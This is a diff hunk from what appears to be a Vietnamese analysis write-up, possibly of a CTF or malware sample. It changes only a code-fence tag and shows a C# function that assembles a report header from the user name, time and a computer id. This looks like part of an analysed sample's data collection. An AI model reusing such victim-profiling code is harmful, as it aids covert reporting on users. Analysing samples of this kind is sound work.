@@ -354,7 +354,7 @@ Khi làm thì mình cần tìm câu trả lời càng sớm càng tốt, nên đ
 
 Từ đây mình sẽ đi vào phân tích đoạn code C#, chú ý đến các hàm sau
 
-```C#
+```csharp
 private static void create(string text)
     {
       text = "From: " + Environment.UserName + "\r\nSubject: " + DateTime.UtcNow.ToString() + "_report_" + Program.comp_id + "\r\n\r\n" + text;
